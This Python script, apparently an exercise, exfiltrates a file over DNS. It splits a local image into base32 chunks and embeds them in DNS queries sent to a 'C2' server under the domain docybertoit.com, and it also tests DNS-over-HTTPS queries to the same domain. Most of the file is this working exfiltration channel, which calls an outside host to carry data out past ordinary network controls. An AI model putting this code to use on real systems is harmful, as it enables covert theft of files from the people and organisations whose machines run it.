"""
### extract a file using DNS

###
"""

import base64
import uuid
import os
import dns.message
import dns.asyncquery
import dns.asyncresolver
from dns.exception import Timeout
import time

file_uuid_str = f'{uuid.uuid4()}'
def main():

    
    file = open("smiley.jpg","rb")
    #data = file.read()
    file_b32_str_list = []  #list of base 32 encoded file chunks
    counter = 0
    while True:
        data = file.read(34)
        if not data:
            break
        b32_byte = base64.b32encode(data)
        b32_str = b32_byte.decode('utf-8')
        file_b32_str_list.append(b32_str)
        
    file.close()

    num_chunks = len(file_b32_str_list)

    """
    C2 codes
    A = setup query
    D = data query
    Z = file upload finished
    1. send setup_query, coded with A and number of file chunks
    2. send file_chunk_query, coded with D, each file chunk identified by its index
    3. send finish_query query with Z, denoting complete
    """

    setup_query =  f'{file_uuid_str}.A.{num_chunks}.docybertoit.com'
    send_plaintext_query(setup_query)
    time.sleep(1)
    counter = 0
    for chunk in file_b32_str_list:
        file_chunk_query = f'{file_uuid_str}.D.{counter}.{chunk}.docybertoit.com'
        send_plaintext_query(file_chunk_query)
        counter += 1

    finish_query = f'{file_uuid_str}.Z.{counter}.docybertoit.com'
    time.sleep(1)
    send_plaintext_query(finish_query)


def send_plaintext_query(query: str):
    """sends a query using the dnspython package to the c2 server. 
    """



    #https://dnspython.readthedocs.io/en/stable/query.html#dns.query.udp
    q = dns.message.make_query(query, 'A')
    server = "10.0.10.163"
    try:
        r = dns.query.udp(q=q, where=server, timeout=.00001)
    except dns.exception.Timeout as e:
        print(f"sending: {query} to {server}")
        return  # this is expected, we don't care about the return query
    except Exception as e:
        print(e)

def send_doh_query(query: str):
    import requests
    where = '1.1.1.1'
    qname = 'example.com.'
    
    # one method is to use context manager, session will automatically close
    with requests.sessions.Session() as session:
        # q = dns.message.make_query(qname, dns.rdatatype.A)
        q = dns.message.make_query("example.com", "A")
        r = dns.query.https(q, where, session=session)
        for answer in r.answer:
            print(answer)
    

    where = 'https://dns.google/dns-query'
    qname = 'example.net.'
    # second method, close session manually
    session = requests.sessions.Session()
    q = dns.message.make_query(qname, dns.rdatatype.A)
    r = dns.query.https(q, where, session=session)
    for answer in r.answer:
        print(answer) 

    """sends query using dns over https
    https://dnspython.readthedocs.io/en/latest/query.html#https
    examples: https://github.com/rthalley/dnspython/blob/master/examples/doh.py
    """
    session = requests.sessions.Session()
    q = dns.message.make_query("asdfasdfasdfasdfasdfasdfad123.234234.asdf.example.com", "A")
    r = dns.query.https(q, where='https://doh.docybertoit.com/dns', session=session, post=False)
    session.close
    return
    q = dns.message.make_query(query, 'A')
    server = "https://doh.docybertoit.com/dns"
    r = dns.query.https(q=q, where=server, post=True, timeout=3)

if __name__ == "__main__":
    #main()
    send_doh_query("asdsdfgsdfg.docybertoit.com")